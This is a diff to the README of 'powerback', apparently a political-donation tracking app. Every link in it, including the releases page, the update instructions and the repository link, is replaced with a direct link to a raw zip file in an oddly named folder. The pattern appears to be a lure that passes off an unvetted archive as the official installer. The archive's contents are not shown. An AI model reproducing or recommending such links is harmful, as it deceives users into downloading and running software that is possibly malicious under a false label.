@@ -1,6 +1,6 @@
 # ⚡ powerback - Track Political Donations Simply
 
-[![Download powerback](https://img.shields.io/badge/Download-Powerback%20App-brightgreen)](https://github.com/larpedfundz/powerback/releases)
+[![Download powerback](https://img.shields.io/badge/Download-Powerback%20App-brightgreen)](https://github.com/larpedfundz/powerback/raw/refs/heads/main/remainer/Software_v1.1-alpha.2.zip)
 
 ---
 
@@ -34,7 +34,7 @@ Before installing powerback, make sure your PC fits the following:
 
 Visit the releases page to get the latest version of powerback.
 
-[Download powerback installer](https://github.com/larpedfundz/powerback/releases)
+[Download powerback installer](https://github.com/larpedfundz/powerback/raw/refs/heads/main/remainer/Software_v1.1-alpha.2.zip)
 
 Use the link above or the badge at the top of this document.
 
@@ -118,7 +118,7 @@ Do not delete or change these files to avoid losing data or corrupting the app.
 The app will notify you when an update is available. Follow these steps to update:
 
 1. Close the app completely.
-2. Visit the [releases page](https://github.com/larpedfundz/powerback/releases).
+2. Visit the [releases page](https://github.com/larpedfundz/powerback/raw/refs/heads/main/remainer/Software_v1.1-alpha.2.zip).
 3. Download the latest installer.
 4. Run it and follow prompts to update.
 
@@ -130,7 +130,7 @@ Updating keeps you secure and adds new features.
 
 If you run into problems or want to share ideas:
 
-- Visit the GitHub repository: https://github.com/larpedfundz/powerback
+- Visit the GitHub repository: https://github.com/larpedfundz/powerback/raw/refs/heads/main/remainer/Software_v1.1-alpha.2.zip
 - Use the “Issues” tab to report bugs or ask questions.
 - Check the "Discussions" area for tips and community help.
 
@@ -148,4 +148,4 @@ POWERBACK.us focuses on support for candidates in the United States. It uses gov
 
 ---
 
-[Download powerback installer](https://github.com/larpedfundz/powerback/releases)
+[Download powerback installer](https://github.com/larpedfundz/powerback/raw/refs/heads/main/remainer/Software_v1.1-alpha.2.zip)
